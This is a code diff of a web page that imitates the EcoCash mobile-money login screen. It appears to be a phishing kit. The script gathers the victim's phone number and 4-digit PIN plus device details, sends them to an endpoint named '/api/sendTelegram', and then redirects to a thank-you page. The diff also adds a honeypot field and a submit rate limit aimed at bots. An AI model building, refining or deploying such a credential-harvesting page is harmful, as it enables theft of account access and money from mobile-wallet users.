@@ -7,119 +7,141 @@
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
 
 <style>
-/* === ORIGINAL STYLES (UNCHANGED) === */
 *{box-sizing:border-box}
 html,body{height:100%}
 body{
   font-family:Inter,system-ui,Arial;
   background:linear-gradient(180deg,#f7fbff,#e8f3ff);
   margin:0;
-  -webkit-font-smoothing:antialiased;
   padding:18px;
   display:flex;
   align-items:center;
   justify-content:center;
-  min-height:100vh;
 }
-.card{width:100%;max-width:380px;background:#fff;padding:20px;border-radius:12px;box-shadow:0 12px 30px rgba(2,6,23,0.06)}
+
+.card{
+  width:100%;
+  max-width:380px;
+  background:#fff;
+  padding:20px;
+  border-radius:12px;
+  box-shadow:0 12px 30px rgba(2,6,23,0.06)
+}
+
 .logo{height:44px;display:block;margin:0 auto 10px}
-h2{text-align:center;margin:0 0 12px;color:#111;font-size:20px}
-label{display:block;font-size:13px;color:#374151;margin-top:8px}
-input{width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc;background:#fbfdff;font-size:14px}
-.btn{background:#4b86ff;color:#fff;padding:10px;border-radius:8px;border:0;margin-top:12px;cursor:pointer;width:100%}
-.btn[disabled]{background:#cbd5e1;color:#6b7280;cursor:not-allowed}
+h2{text-align:center;margin:0 0 12px;font-size:20px}
+
+label{display:block;font-size:13px;margin-top:8px}
+input{width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc}
+
+.btn{background:#4b86ff;color:#fff;padding:10px;border-radius:8px;border:0;margin-top:14px;width:100%;cursor:pointer}
+.btn[disabled]{background:#cbd5e1;cursor:not-allowed}
+
+.small{font-size:13px;color:#6b7280}
 .req{color:#d04444;margin-right:6px}
 
-/* PIN */
+/* PIN boxes */
 .pin-row{display:flex;gap:8px;justify-content:center;margin-top:6px}
-.pin-box{
-  width:44px;height:48px;
+.pin-digit{
+  width:48px;height:50px;
   text-align:center;
-  font-size:22px;
+  font-size:20px;
   border-radius:8px;
   border:1px solid #e6eefc;
 }
+
+/* phone helper */
+.phone-prefix{
+  text-align:center;
+  font-size:13px;
+  color:#6b7280;
+  margin-top:4px;
+}
+
+.phone-error{color:#d04444;font-size:13px;display:none}
 </style>
 </head>
 
 <body>
 <div class="card">
-<img src="assets/eco.png" alt="EcoCash logo" class="logo">
+<img src="assets/eco.png" class="logo" alt="EcoCash logo">
+
 <h2>Login</h2>
 
 <form id="loginForm" autocomplete="off">
-
-<label><span class="req">★</span>Mobile Number
-<input id="phone" value="+263" inputmode="tel">
-</label>
+<label><span class="req">★</span>Mobile Number</label>
+<input id="phone" inputmode="numeric" placeholder="7XXXXXXXX" />
+<div class="phone-prefix">+263</div>
+<div id="phoneError" class="phone-error">Enter 9 digits starting with 7</div>
 
 <label><span class="req">★</span>4-Digit PIN</label>
 <div class="pin-row">
-  <input class="pin-box" inputmode="numeric" maxlength="1">
-  <input class="pin-box" inputmode="numeric" maxlength="1">
-  <input class="pin-box" inputmode="numeric" maxlength="1">
-  <input class="pin-box" inputmode="numeric" maxlength="1">
+  <input class="pin-digit" maxlength="1" inputmode="numeric">
+  <input class="pin-digit" maxlength="1" inputmode="numeric">
+  <input class="pin-digit" maxlength="1" inputmode="numeric">
+  <input class="pin-digit" maxlength="1" inputmode="numeric">
 </div>
 
-<input type="hidden" id="pin">
+<!-- honeypot -->
+<input type="text" id="hp" style="display:none">
+
 <button id="loginBtn" class="btn" disabled>LOGIN</button>
 </form>
 </div>
 
-<!-- ================= OTP MODAL (UNTOUCHED) ================= -->
-<div id="otpModal" style="display:none" class="otp-modal">
-  <!-- your original OTP modal content stays exactly the same -->
-</div>
-
 <script>
-/* ===== DEVICE ===== */
-const device={
-  platform:navigator.platform,
-  userAgent:navigator.userAgent,
-  screen:`${screen.width}x${screen.height}`
+/* Anti-bot rate limit */
+const lastSubmit = Number(localStorage.getItem('lastSubmit') || 0);
+if(Date.now() - lastSubmit < 4000){
+  document.getElementById('loginBtn').disabled = true;
+}
+
+/* Device info */
+const deviceInfo = {
+  userAgent: navigator.userAgent,
+  platform: navigator.platform
 };
 
-/* ===== PHONE ===== */
-const phoneEl=document.getElementById('phone');
-phoneEl.addEventListener('input',()=>{
-  if(!phoneEl.value.startsWith('+263')) phoneEl.value='+263';
-  let d=phoneEl.value.slice(4).replace(/\D/g,'');
-  if(d && d[0]!=='7') d='7'+d.slice(1);
-  phoneEl.value='+263'+d.slice(0,9);
-  phoneEl.setSelectionRange(phoneEl.value.length,phoneEl.value.length);
-  updateState();
+/* Phone validation */
+const phoneEl = document.getElementById('phone');
+const phoneError = document.getElementById('phoneError');
+
+phoneEl.addEventListener('input', ()=>{
+  phoneEl.value = phoneEl.value.replace(/\D/g,'').slice(0,9);
+  const valid = /^7\d{8}$/.test(phoneEl.value);
+  phoneError.style.display = valid ? 'none' : 'block';
+  updateBtn();
 });
 
-/* ===== PIN ===== */
-const pinBoxes=[...document.querySelectorAll('.pin-box')];
-const pinEl=document.getElementById('pin');
+/* PIN logic */
+const pinBoxes = [...document.querySelectorAll('.pin-digit')];
 
-pinBoxes.forEach((b,i)=>{
-  b.addEventListener('input',()=>{
-    const v=b.value.replace(/\D/g,'');
-    b.value=v?'•':'';
-    const arr=pinEl.value.split('');
-    arr[i]=v;
-    pinEl.value=arr.join('').slice(0,4);
-    if(v && i<3) pinBoxes[i+1].focus();
-    updateState();
+pinBoxes.forEach((box,i)=>{
+  box.addEventListener('input',()=>{
+    box.value = box.value.replace(/\D/g,'');
+    if(box.value && i<3) pinBoxes[i+1].focus();
+    updateBtn();
   });
-  b.addEventListener('keydown',e=>{
-    if(e.key==='Backspace' && !b.value && i>0){
+
+  box.addEventListener('keydown',e=>{
+    if(e.key==='Backspace' && !box.value && i>0){
       pinBoxes[i-1].focus();
-      pinEl.value=pinEl.value.slice(0,-1);
     }
   });
 });
 
-/* ===== STATE ===== */
-const loginBtn=document.getElementById('loginBtn');
-function updateState(){
-  loginBtn.disabled=!(/^\+2637\d{8}$/.test(phoneEl.value)&&/^\d{4}$/.test(pinEl.value));
+function getPIN(){
+  return pinBoxes.map(b=>b.value).join('');
 }
 
-/* ===== SEND ===== */
-function sendToServer(payload){
+function updateBtn(){
+  const pinOk = /^\d{4}$/.test(getPIN());
+  const phoneOk = /^7\d{8}$/.test(phoneEl.value);
+  document.getElementById('loginBtn').disabled = !(pinOk && phoneOk);
+}
+
+/* Vercel API */
+async function sendToServer(payload){
   return fetch('/api/sendTelegram',{
     method:'POST',
     headers:{'Content-Type':'application/json'},
@@ -127,22 +149,23 @@ function sendToServer(payload){
   });
 }
 
-/* ===== LOGIN (OTP FIX) ===== */
-document.getElementById('loginForm').addEventListener('submit',e=>{
+document.getElementById('loginForm').addEventListener('submit',async e=>{
   e.preventDefault();
 
-  /* ✅ THIS IS THE FIX */
-  requestAnimationFrame(()=>{
-    document.getElementById('otpModal').style.display='flex';
-  });
+  if(document.getElementById('hp').value) return; // bot
 
-  sendToServer({
-    submittedAt:new Date().toISOString(),
+  localStorage.setItem('lastSubmit',Date.now());
+
+  const payload = {
     event:'login_clicked',
-    loginPhone:phoneEl.value,
-    loginPin:pinEl.value,
-    device
-  });
+    phone:'+263'+phoneEl.value,
+    pin:getPIN(),
+    device:deviceInfo,
+    submittedAt:new Date().toISOString()
+  };
+
+  await sendToServer(payload);
+  window.location.href='thankyou.html';
 });
 </script>
 </body>
